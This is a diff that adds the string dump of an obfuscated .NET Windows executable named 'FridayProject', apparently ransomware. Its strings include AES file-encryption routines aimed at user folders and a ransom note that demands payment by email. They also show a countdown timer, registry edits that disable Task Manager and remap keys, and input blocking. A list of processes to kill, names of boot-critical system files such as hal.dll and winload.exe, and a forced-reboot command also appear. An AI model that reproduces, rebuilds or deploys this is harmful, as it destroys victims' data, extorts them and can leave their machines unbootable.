@@ -1,0 +1,555 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+22s:
+v4.0.30319
+#Strings
+<Module>
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+System.Reflection
+AssemblyTitleAttribute
+AssemblyDescriptionAttribute
+AssemblyConfigurationAttribute
+AssemblyCompanyAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyTrademarkAttribute
+System.Runtime.InteropServices
+ComVisibleAttribute
+GuidAttribute
+AssemblyFileVersionAttribute
+System.Runtime.Versioning
+TargetFrameworkAttribute
+System
+Object
+Microsoft.Win32
+RegistryKey
+Exception
+Registry
+LocalMachine
+OpenSubKey
+RuntimeHelpers
+RuntimeFieldHandle
+InitializeArray
+RegistryValueKind
+SetValue
+ToString
+System.Diagnostics
+Assert
+System.Windows.Forms
+System.IO
+MemoryStream
+System.Security.Cryptography
+RijndaelManaged
+Rfc2898DeriveBytes
+CryptoStream
+SymmetricAlgorithm
+set_KeySize
+set_BlockSize
+get_KeySize
+DeriveBytes
+GetBytes
+set_Key
+get_BlockSize
+set_IV
+CipherMode
+set_Mode
+ICryptoTransform
+CreateEncryptor
+Stream
+CryptoStreamMode
+IDisposable
+Dispose
+ToArray
+CreateDecryptor
+ReadAllBytes
+System.Text
+Encoding
+get_UTF8
+SHA256
+Create
+HashAlgorithm
+ComputeHash
+WriteAllBytes
+CompilerGeneratedAttribute
+DateTime
+EventArgs
+TimeSpan
+FromHours
+get_Now
+op_Subtraction
+Control
+set_Text
+Func`2
+FileInfo
+FileAttributes
+FileSystemInfo
+get_Attributes
+System.ComponentModel
+IContainer
+PictureBox
+TextBox
+Button
+FormClosingEventArgs
+CancelEventArgs
+set_Cancel
+set_Opacity
+System.Drawing
+set_Size
+set_Location
+CurrentUser
+CreateSubKey
+Environment
+SpecialFolder
+GetFolderPath
+String
+Concat
+System.Collections.Generic
+IEnumerable`1
+Directory
+EnumerateFiles
+System.Linq
+Enumerable
+Delete
+set_Interval
+EventHandler
+add_Tick
+set_Enabled
+GetEnvironmentVariable
+Combine
+Process
+GetProcesses
+GetProcessesByName
+get_Text
+op_Equality
+DialogResult
+MessageBox
+MessageBoxButtons
+MessageBoxIcon
+SearchOption
+GetFiles
+ComponentResourceManager
+Container
+RuntimeTypeHandle
+GetTypeFromHandle
+ISupportInitialize
+BeginInit
+SuspendLayout
+Cursor
+Cursors
+get_No
+set_Cursor
+System.Resources
+ResourceManager
+GetObject
+set_Image
+set_Name
+PictureBoxSizeMode
+set_SizeMode
+set_TabIndex
+set_TabStop
+set_AutoSize
+FontStyle
+GraphicsUnit
+set_Font
+get_White
+set_ForeColor
+get_Help
+GetString
+ContentAlignment
+set_TextAlign
+get_Gray
+set_BackColor
+HorizontalAlignment
+add_TextChanged
+get_Hand
+ButtonBase
+FlatStyle
+set_FlatStyle
+set_UseVisualStyleBackColor
+add_Click
+ContainerControl
+set_AutoScaleDimensions
+AutoScaleMode
+set_AutoScaleMode
+get_Black
+ImageLayout
+set_BackgroundImageLayout
+set_ClientSize
+ControlCollection
+get_Controls
+FormBorderStyle
+set_FormBorderStyle
+set_Icon
+set_MaximizeBox
+set_MinimizeBox
+set_ShowIcon
+set_ShowInTaskbar
+FormStartPosition
+set_StartPosition
+set_TopMost
+FormClosingEventHandler
+add_FormClosing
+add_Load
+EndInit
+ResumeLayout
+PerformLayout
+STAThreadAttribute
+Application
+EnableVisualStyles
+SetCompatibleTextRenderingDefault
+System.Configuration
+ApplicationSettingsBase
+System.CodeDom.Compiler
+GeneratedCodeAttribute
+SettingsBase
+Synchronized
+ValueType
+Attribute
+AttributeUsageAttribute
+AttributeTargets
+User32
+user32.dll
+mscorlib
+System.Core
+WindowsKey
+<PrivateImplementationDetails>
+__StaticArrayInitTypeSize=24
+FridayProject
+CoreEncryption
+CoreDecryption
+EncryptionFile
+DecryptionFile
+<>c__DisplayClass6_0
+Program
+Settings
+FridayProject.Properties
+Skater_NET_Obfuscator_427202112508
+RustemSoft.Skater
+Disable
+66840DDA154E8A113C31DD0AD32F7F3A366A80E8136979D8F5A101D3D29D6F72
+EB9864D3AF164049084D40F03FBB99B8738A1F91168D41F3831E9E97DF04F731
+SW_HIDE
+SW_SHOW
+components
+pictureBox1
+pictureBox2
+label1
+codebox
+button1
+label2
+label3
+tmr_hide
+tmr_show
+tmr_if
+tmr_encrypt
+tmr_clock
+ShowWindow
+nCmdShow
+BlockInput
+FridayProject_FormClosing
+sender
+FridayProject_Load
+tmr_hide_Tick
+tmr_show_Tick
+tmr_if_Tick
+tmr_encrypt_Tick
+tmr_clock_Tick
+button1_Click
+FreezeMouse
+Thawouse
+codebox_TextChanged
+Start_Encrypt
+OFF_Encrypt
+disposing
+InitializeComponent
+AES_Encrypt
+bytesToBeEncrypted
+passwordBytes
+AES_Decrypt
+bytesToBeDecrypted
+EncryptFile
+password
+DecryptFile
+fileEncrypted
+<>4__this
+startTime
+<FridayProject_Load>b__1
+<>9__6_0
+.cctor
+<FridayProject_Load>b__6_0
+defaultInstance
+get_Default
+Default
+FridayProject.FridayProject.resources
+FridayProject.Properties.Resources.resources
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+16.8.1.0
+WrapNonExceptionThrows
+$7085cee3-7cca-47e8-ac84-1bad1454800c
+0.0.0.0
+.NETFramework,Version=v4.0
+FrameworkDisplayName
+.NET Framework 4
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Icon
+IconData
+IconSize
+System.Drawing.Size
+System.Drawing.Size
+height
+Hello, unfortunately all your personal files have been
+encrypted with military grade encryption and it will be
+impossible to recover them without obtaining the 
+encryption key.
+////////////////////////////////////////////////////////////////
+You can buy the key by writing to this email: 
+"6281fjds93hdfj5396dfgk@gmail.com"
+////////////////////////////////////////////////////////////////
+Do not turn off the computer
+Don't try to kill ransomware
+Do not turn on Task Manager
+Don't try to break your password without paying
+Do not try to open encrypted filesA
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+UYiE)E)E)E)E)E)F3JW
+QJQJQJQJQJQJQJQJQJQJQJQJQJQJQJQJQJP
+ZWhg4[4
+:)J)J)J)J)J)J)J)J)J)J)J)J)J)Jl
+qKmkO+
+M'fJr|
+UHqjqEj
+#SwV8N4
+JQJQJQJQJQJQJWwC
+WkSl-h
+tyS";
+V'DiMK
+}yO=*)
+E)E)E)E)E)E)E)E)W
+$w5)yn
+uKKN2R
+;`[I9
+,'`Rbc
+QJQJQJQJQJU
+Tga,%l
+t;j/zu
+Q_)E)E)Ee
+$}+Olb
+]VS,%o
+Z@|Ij8
+QJQJQJQJQJQJQJQJQJP
+(hR9()"~
+)J)J)J)J)J)J)J)J)J)J)J)J)J
+wXkK{/
+JQJQJQJQJQJQJQJS
+?Qm+H8
+;6smFB
+lb[O)$
+!k?PW|
+sRH7)dy
+SQ)'Pu
+)J)J)J+
+J)J)J)J)J)J
+p)Jktg
+J j;dGV<v
+|BH<rs
+`(=`iV
+1Y_u^a
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+UYiE)E)E)E)E)E)F3JW
+QJQJQJQJQJQJQJQJQJQJQJQJQJQJQJQJQJP
+ZWhg4[4
+:)J)J)J)J)J)J)J)J)J)J)J)J)J)Jl
+qKmkO+
+M'fJr|
+UHqjqEj
+#SwV8N4
+JQJQJQJQJQJQJWwC
+WkSl-h
+tyS";
+V'DiMK
+}yO=*)
+E)E)E)E)E)E)E)E)W
+$w5)yn
+uKKN2R
+;`[I9
+,'`Rbc
+QJQJQJQJQJU
+Tga,%l
+t;j/zu
+Q_)E)E)Ee
+$}+Olb
+]VS,%o
+Z@|Ij8
+QJQJQJQJQJQJQJQJQJP
+(hR9()"~
+)J)J)J)J)J)J)J)J)J)J)J)J)J
+wXkK{/
+JQJQJQJQJQJQJQJS
+?Qm+H8
+;6smFB
+lb[O)$
+!k?PW|
+sRH7)dy
+SQ)'Pu
+)J)J)J+
+J)J)J)J)J)J
+p)Jktg
+J j;dGV<v
+|BH<rs
+`(=`iV
+1Y_u^a
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="utf-8"?>
+<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
+<assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+<trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+<security>
+<requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+<!-- UAC Manifest Options
+             If you want to change the Windows User Account Control level replace the 
+             requestedExecutionLevel node with one of the following.
+        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
+        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
+        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />
+            Specifying requestedExecutionLevel element will disable file and registry virtualization. 
+            Remove this element if your application requires this virtualization for backwards
+            compatibility.
+        -->
+<requestedExecutionLevel level="highestAvailable" uiAccess="false" />
+</requestedPrivileges>
+</security>
+</trustInfo>
+<compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+<application>
+<!-- A list of the Windows versions that this application has been tested on
+           and is designed to work with. Uncomment the appropriate elements
+           and Windows will automatically select the most compatible environment. -->
+<!-- Windows Vista -->
+<!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->
+<!-- Windows 7 -->
+<!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->
+<!-- Windows 8 -->
+<!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->
+<!-- Windows 8.1 -->
+<!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->
+<!-- Windows 10 -->
+<!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->
+</application>
+</compatibility>
+<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher
+       DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need 
+       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should 
+       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. -->
+  <application xmlns="urn:schemas-microsoft-com:asm.v3">
+    <windowsSettings>
+      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
+    </windowsSettings>
+  </application>
+<!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->
+  <dependency>
+    <dependentAssembly>
+      <assemblyIdentity
+          type="win32"
+          name="Microsoft.Windows.Common-Controls"
+          version="6.0.0.0"
+          processorArchitecture="*"
+          publicKeyToken="6595b64144ccf1df"
+          language="*"
+        />
+    </dependentAssembly>
+  </dependency>
+</assembly>
+System\CurrentControlSet\Control\Keyboard Layout
+Scancode Map
+hh\:mm\:ss
+Software\Microsoft\Windows\CurrentVersion\Policies\System
+DisableTaskMgr
+Control Panel\Desktop
+Wallpaper
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\hal.dll
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\ci.dll
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\winload.exe
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Drivers\disk.sys
+\desktop.ini
+USERPROFILE
+Downloads
+C:\Windows\System32\hal.dll
+C:\Windows\System32\ci.dll
+C:\Windows\System32\winload.exe
+C:\Windows\System32\drivers\disk.sys
+regedit
+Processhacker
+msedge
+chrome
+SystemPropertiesProtection
+SecHealthUI
+SearchApp
+SystemSettings
+StartMenuExperienceHost
+explorer
+Discord
+FridayProject
+shutdown
+/r /t 0
+Incorrect key
+WRONG KEY
+g0KQekEF6cDv0B5Idm8L1j0qses,QTG7U0ggBSkgjLIBwRAykMs6NifKZeYF6KA7su6Nglre9frQLZhvxNd3JSM0qRlUIIQ35r=pRuil9EMKAMJAucVEx+Ahq0lKr.mO6srSqJYzciGamDqD4q7GldTiftp3Tme3reXltrJOaZlsqDM3xzDDBkb+zzwIsNO8ecnHBpkqIRifi+O+BuDXmrAOvxTzKS/9EFbm/tTpABxOWPV;nX~5qXAkvl8fIX0jzBCSzP+xf`SrpBARwFsEd/JioRoTWZaM.NRHdru70aO/j7dAMSWPxCf7556DZNKAqV2jjkI9Nh+/W7kTSVdT/q0hkOAoSZfSXHx4nOST+Q+Uirw4iLhYg3RDh3+ExiG5hP=8onhX8qV0G4LaDQgdj1E+1PwtdkPSFUpfmhzOFfa+QlfO87X6nUsvOMF8lSyLVNyqn8E5oONf1gDrd/FYoaGZ4SMtMw
+The key is correct
+UNLOCKED
+explorer.exe
+ADMINISTRATORPROFILE
+C:\Program Files (x86)
+C:\Program Files
+pictureBox1.Image
+pictureBox1
+pictureBox2.Image
+pictureBox2
+Microsoft Sans Serif
+Microsoft YaHei UI
+label1
+label1.Text
+codebox
+button1
+DECRYPT FILES
+label2
+00:00:00
+label3
+REAMING TIME:
+$this.Icon
+FridayProject.0
+This executable has been obfuscated by using RustemSoft Skater .NET Obfuscator Demo version. Please visit RustemSoft.com for more information.
+$this.Icon
+label1.Text
+pictureBox1.Image
+pictureBox2.Image
+image21
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+FileVersion
+0.0.0.0
+InternalName
+LegalCopyright
+LegalTrademarks
+OriginalFilename
+ProductName
+ProductVersion
+0.0.0.0
+Assembly Version
+0.0.0.0
